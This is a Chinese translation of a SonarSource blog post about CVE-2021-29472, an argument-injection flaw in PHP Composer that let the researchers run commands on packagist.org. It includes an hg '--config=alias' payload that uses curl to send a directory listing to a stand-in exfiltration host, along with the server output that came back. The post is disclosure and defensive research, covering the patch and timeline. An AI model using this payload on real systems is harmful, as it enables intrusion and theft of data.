> 原文链接: https://www.anquanke.com//post/id/240452 


# 供应链攻击之PHP Composer漏洞


                                阅读量   
                                **121100**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者sonarsource，文章来源：sonarsource.com
                                <br>原文地址：[https://blog.sonarsource.com/php-supply-chain-attack-on-composer/](https://blog.sonarsource.com/php-supply-chain-attack-on-composer/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01eda7df25602c6981.png)](https://p5.ssl.qhimg.com/t01eda7df25602c6981.png)



简单概括本文的内容为：PHP包管理器Composer中，程序包来源下载URL部分的处理方式不当，导致了远程命令执行漏洞。攻击者可利用**参数注入**构建恶意的Mercurial库URL，并利用其alias选项执行攻击者指定的shell命令。

## 前言

供应链攻击（Supply Chain Attack）一直是目前的一个热门话题。去年，即2020年发生了一次有史以来规模最大的软件供应链攻击，造成18,000位SolarWinds客户被后门感染。

简单回顾一下SolarWinds供应链攻击事件。SolarWinds Inc是一家美国软件开发公司，主要业务为帮助企业管理网络、系统和信息技术基础设施。攻击者在入侵SolarWinds后，将其官网提供的Orion软件安装包替换成植入后门的版本。攻击者对文件`SolarWinds.Orion.Core.BussinessLayer.dll`的源码进行篡改并添加了后门代码，该文件具有合法数字签名会伴随软件更新下发。后门代码伪装成Orion OIP协议的流量进行通信，能将恶意行为融合到SolarWinids的合法行为中。

而在今年年初，一名安全研究人员发现了一种新型供应链攻击技术，该新技术能够对许多互联网巨头公司造成威胁，如苹果公司，微软和Paypal等其他领头公司。这些攻击，它们主要利用的点是，所有现在软件都是基于其他第三方软件组件构建的，但通常对下载的软件包都没有清晰的可见性。虽然对一些组件的重用可以加快软件开发过程，但是同时，这也变成了感染供应链的一个非常微妙且有效的切入口，能够同时危害许多机构。

在PHP的生态系统中，Composer是管理和安装软件所需依赖的主要工具。全世界的开发团队都使用它来简化依赖的更新过程，并确保应用程序可以轻松实现跨环境和版本工作。出于该目的，Composer使用了名为[**Packagist**](https://packagist.org/)的在线服务，该服务确定了包下载的正确供应链。在短短一个月的时间里，Packagist服务就处理了大约14亿次的下载请求！

在我们的安全研究中，我们在Packagist使用的Composer源码中发现了一个严重的漏洞。该漏洞允许我们在Packagist.org 服务器上执行任意系统命令。这个中心组件每个月提供超过100万个package元数据请求，其中一个漏洞就会产生巨大的影响，因为这种访问可能被用来窃取package维护者的身份凭证，又或者，能够将package的下载重定向到存在后门的服务器。

在这篇文章中，我们将介绍检测到的漏洞以及漏洞的修复方案。一些漏洞代码存在已久，可以追溯到10年前Composer的第一个版本。在发现漏洞之后，我们将所有问题都报告给了Packagist团队，他们在12小时内迅速部署了一个修复，并为此漏洞申请了[CVE-2021-29472](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472)。据他们所知，该漏洞还未被利用（详见他们的[blog](https://blog.packagist.com/composer-command-injection-vulnerability/)）。



## 漏洞细节

当Composer下载软件包时，它首先通过查询Packagist来获取所需元数据（例如，[此处为Composer本身](https://repo.packagist.org/p2/composer/composer.json)）。这个元数据包含两个关于该从哪里获取代码的字段：**source**，指向开发者仓库；**dist**，指向预构建的存档。当从仓库下载代码时，Composer将使用外部系统命令来避免重复实现特定于每个版本控制软件（VCS，Version Control Software，版本控制是维护工程蓝图的标准做法，也是一种软件工程技巧，借此能在软件开发的过程中，确保由不同人所编辑的同一程序都能得到同步）的逻辑。为此，可以使用包装器`ProcessExecutor`来执行此类调用：

[**composer/src/Composer/Util/ProcessExecutor.php**](https://github.com/composer/composer/blob/master/src/Composer/Util/ProcessExecutor.php)

```
use Symfony\Component\Process\Process;
// [...]
class ProcessExecutor
`{`
    // [...]
    public function execute($command, &amp;$output = null, $cwd = null)
    `{`
        if (func_num_args() &gt; 1) `{`
            return $this-&gt;doExecute($command, $cwd, false, $output);
        `}`
        return $this-&gt;doExecute($command, $cwd, false);
    `}`
    // [...]
    private function doExecute($command, $cwd, $tty, &amp;$output = null)
    `{`
        // [...]
        if (method_exists('Symfony\Component\Process\Process', 'fromShellCommandline')) `{`
            // [1]
            $process = Process::fromShellCommandline($command, $cwd, null, null, static::getTimeout());
        `}` else `{`
            // [2]
            $process = new Process($command, $cwd, null, null, static::getTimeout());
        `}`
        if (!Platform::isWindows() &amp;&amp; $tty) `{`
            try `{`
                $process-&gt;setTty(true);
            `}` catch (RuntimeException $e) `{`
                // ignore TTY enabling errors
            `}`
        `}`
        $callback = is_callable($output) ? $output : array($this, 'outputHandler');
        $process-&gt;run($callback);
```

我们看到，在`[1]`和`[2]`处，参数`$command`是由`Symfony\Component\Process\Process`在shell中执行的。大多数`ProcessExecutor`调用均在VCS驱动程序中执行，该驱动程序负责对远程和本地仓库进行所有操作（比如clone，提取信息等），例如在Git驱动程序中：

[**composer/src/Composer/Repository/Vcs/GitDriver.php**](https://github.com/composer/composer/blob/e7f6dd287ca7f529d7aedb8249a60444d945affc/src/Composer/Repository/Vcs/GitDriver.php#L204-L241)

```
public static function supports(IOInterface $io, Config $config, $url, $deep = false)
`{`
    if (preg_match('#(^git://|\.git/?$|git(?:olite)?@|//git\.|//github.com/)#i', $url)) `{`
        return true;
    `}`
    // [...]
    try `{`
        $gitUtil-&gt;runCommand(function ($url) `{`
            return 'git ls-remote --heads ' . ProcessExecutor::escape($url); // [1]
        `}`, $url, sys_get_temp_dir());
    `}` catch (\RuntimeException $e) `{`
        return false;
    `}`
```

尽管使用了`ProcessExector::escape()`对`$url`参数进行了转义，以防止shell对子命令（`$(...)`， `…` ）进行求值，但是没什么能阻止用户提供以`--`开头的值，并将参数添加到最终命令中。这种类型的漏洞被称为**参数注入**（**Parameter Injection**或**Argument Injection**）。

同类型的漏洞模式可以在其他所有驱动程序中找到，在这些驱动程序中，用户可控数据都被正确转义，但会和系统命令拼接：
<li>
[**composer/src/Composer/Repository/Vcs/SvnDriver.php**](https://github.com/composer/composer/blob/cda6e8bea63bd0ab73c7cd6be6c2016d32c141ec/src/Composer/Repository/Vcs/SvnDriver.php#L299-L337)
<pre><code class="lang-php hljs">public static function supports(IOInterface $io, Config $config, $url, $deep = false)
`{`
    $url = self::normalizeUrl($url);
    if (preg_match('#(^svn://|^svn\+ssh://|svn\.)#i', $url)) `{`
        return true;
    `}`
    // [...]
    $process = new ProcessExecutor($io);
    $exit = $process-&gt;execute(
        "svn info --non-interactive ".ProcessExecutor::escape($url),
        $ignoredOutput
    );
</code></pre>
</li>
<li>
[**composer/src/Composer/Repository/Vcs/HgDriver.php**](https://github.com/composer/composer/blob/cda6e8bea63bd0ab73c7cd6be6c2016d32c141ec/src/Composer/Repository/Vcs/HgDriver.php#L206-L235)
<pre><code class="lang-php hljs">public static function supports(IOInterface $io, Config $config, $url, $deep = false)
`{`
    if (preg_match('#(^(?:https?|ssh)://(?:[^@]+@)?bitbucket.org|https://(?:.*?)\.kilnhg.com)#i', $url)) `{`
        return true;
    `}`
    // [...]
    $process = new ProcessExecutor($io);
    $exit = $process-&gt;execute(sprintf('hg identify %s', ProcessExecutor::escape($url)), $ignored);
    return $exit === 0;
`}`
</code></pre>
参数注入漏洞是一种比较cool的漏洞，但它们经常在代码审计的过程中被忽略，在黑盒项目中则是完全被忽略。虽然我们知道用户可控的值应该使用`escapeshellarg()`正确地处理中和，但是没有提醒我们用户可控的值依旧可以是选项(即`--`)。
</li>


## 攻击packagist.org

以防您不熟悉PHP是如何打包的，先简单介绍下。只要在最上层目录中添加一个名为`composer.json`的文件，您的项目就会成为一个package。然后，只需要在packagist.org上创建一个账户，提交仓库URL，packagist.org将自动获取你的项目，解析`composer.json`并创建关联的程序包。如果一切顺利，那么你的package就已经成功公开，在Packagist上公开可见，可以由任何人安装。

Packagist.org会依赖composer中的API来在创建过程中获取package，因而它支持各种VCS，如Git， Subversion，Mercurial等，你可以在[`packagist/src/Entity/Package.php`](//github.com/composer/packagist/blob/efcd1cfed59fa2673faa74748b9e388245c58633/src/Entity/Package.php#L606-L657))中看到，它会执行如下操作：

[**packagist / src / Entity / Package.php**](https://github.com/composer/packagist/blob/efcd1cfed59fa2673faa74748b9e388245c58633/src/Entity/Package.php#L606-L657)

```
$io = new NullIO();
$config = Factory::createConfig();
$io-&gt;loadConfiguration($config);
$httpDownloader = new HttpDownloader($io, $config);
$repository = new VcsRepository(['url' =&gt; $this-&gt;repository], $io, $config, $httpDownloader); // [1]

$driver = $this-&gt;vcsDriver = $repository-&gt;getDriver(); // [2]
if (!$driver) `{`
    return;
`}`

$information = $driver-&gt;getComposerInformation($driver-&gt;getRootIdentifier());
if (!isset($information['name'])) `{`
    return;
`}`

if (null === $this-&gt;getName()) `{`
    $this-&gt;setName(trim($information['name']));
`}`
```

`VcsRepository`（`[1]`）类来自Composer，以及对`getDriver()`（`[2]`）方法的调用会触发对下列VCS drivers类中`supports()`和`initialize()`方法的调用：

> <p>1 . `GitHubDriver`<br>
2 . `GitLabDriver`<br>
3 . `GitBitbucketDriver`<br>
4 . `GitDriver`<br>
5 . `HgBitbucketDriver`<br>
6 . `HgDriver`<br>
7 . `PerforceDriver`<br>
8 . `FossilDriver`<br>
9 . `SvnDriver`</p>

这些类就是我们找到参数注入漏洞的地方。下面就是漏洞利用时间。



## 攻击时间！

我们不经常讨论开发细节，防止任何恶意的大规模开发，但我们觉得这个Composer漏洞本身的影响有限。不过，如果用户碰巧使用了带有用户控制url的Composer和`VcsRepository`，或者您有自己的Packagist实例，那么一定要特别确保您的Composer已经进行了升级来防止漏洞。

由于基本上所有的drivers都是存在漏洞的，所以我们决定找最容易利用的那个进行复现。针对git的参数注入攻击已经有详细的参考方式（`--upload-pack`，`--output`），但是这里的git ls-remote需要一个positional argument（即通过在参数列表中的相对位置确定传递给哪个形参）。我们不能同时提供`--upload-pack`和一个位置参数，因为我们的值使用单括号括起来的。因此我们很难通过它来进行代码执行，再查看看其他的驱动程序。

在使用Mercurial客户端（`hg`）并阅读手册的时候，注意到一个名为`--config`的选项，它能够允许我们在执行任何操作之前将新的配置指令加载到客户端上。客户端支持别名(alias)设置：

> **It is possible to create aliases with the same names as existing commands, which will then override the original definitions. This is almost always a bad idea!**
可以使用与现有命令相同的名字来创建别名，但这样会将原始定义给覆盖掉。
**An alias can start with an exclamation point (!) to make it a shell alias. A shell alias is executed with the shell and will let you run arbitrary commands. As an example,**
别名可以使用感叹号`!`开头，使其成为一个shell别名，shell别名是用shell执行的，可以让您运行任意命令，举个例子：
<pre><code class="lang-shell hljs">*echo = !echo $@*
</code></pre>

我们将identify命令别名为我们构造的shell命令，`hg`将会执行它。得到的payload为：

```
--config=alias.identify=!curl http://exfiltration-host.tld --data “$(ls -alh)”
```

当我们使用该url向packagist.org提交了一个新的package后，我们从AWS主机收到了一下HTTP请求正文：

```
total 120K 
drwxrwxr-x  9 composer composer 4.0K Apr 21 23:19 . 
dr-xr-xr-x 15 composer composer 4.0K Apr 20 07:38 .. 
-r--r--r--  1 composer composer 8.7K Apr 20 07:38 .htaccess 
-r--r--r--  1 composer composer 1.3K Apr 20 07:38 app.php 
-r--r--r--  1 composer composer 8.2K Apr 20 07:38 apple-touch-icon-precomposed.png 
-r--r--r--  1 composer composer 8.2K Apr 20 07:38 apple-touch-icon.png 
dr-xr-xr-x  3 composer composer 4.0K Jan 13 14:35 bundles 
dr-xr-xr-x  4 composer composer 4.0K Apr 20 07:38 css [...] 
lrwxrwxrwx  1 composer composer   15 Aug 13  2020 packages.json -&gt; p/packages.json 
lrwxrwxrwx  1 composer composer   18 Aug 13  2020 packages.json.gz -&gt; p/packages.json.gz 
-r--r--r--  1 composer composer  106 Apr 20 07:38 robots.txt 
-r--r--r--  1 composer composer  798 Apr 20 07:38 search.osd 
dr-xr-xr-x  2 composer composer 4.0K Apr 20 07:38 static-error 
-r--r--r--  1 composer composer 8.8K Apr 20 07:38 touch-icon-192x192.png
```

这说明我们确实在Packagist主机上执行了命令；我们向packagist.org报告了此漏洞，并且并没有尝试提升权限等其他危险操作。



## 修复

Packagist.org的维护人员在12小时内部署了一个热补丁，有效地防止该漏洞。[Composer修复](https://github.com/composer/composer/commit/332c46af8bebdead80a2601350dff7af0ac1f490)在4月27号发布，新版本release 1.10.22 / 2.0.13 也紧跟其后被发布。目前pacakgist.org中使用的Composer是最新的修复版本。



## 时间线

|日期|行动
|------
|2021-04-22|首次联系安全人员（packagist.org）
|2021-04-22|修补程序部署在packagist.org中
|2021-04-26|GitHub分配的CVE-2021-29472
|2021-04-27|发布了Composer 1.10.22和2.0.13



## 概括

在这篇文章中，我们展示了Composer中看似无害的bug是如何对Packagist.org等服务造成影响的。安全研究人员，如Max Justicz，经常能发现程序包管理器和相关服务中的安全问题，这些问题造成的影响可能会很大。因此，相关公司应该花费更多精力在其供应链的审计工具上。



## 参考

1 . [SolarWinds旗下软件被用于供应链攻击事件分析](https://www.secrss.com/articles/27889)
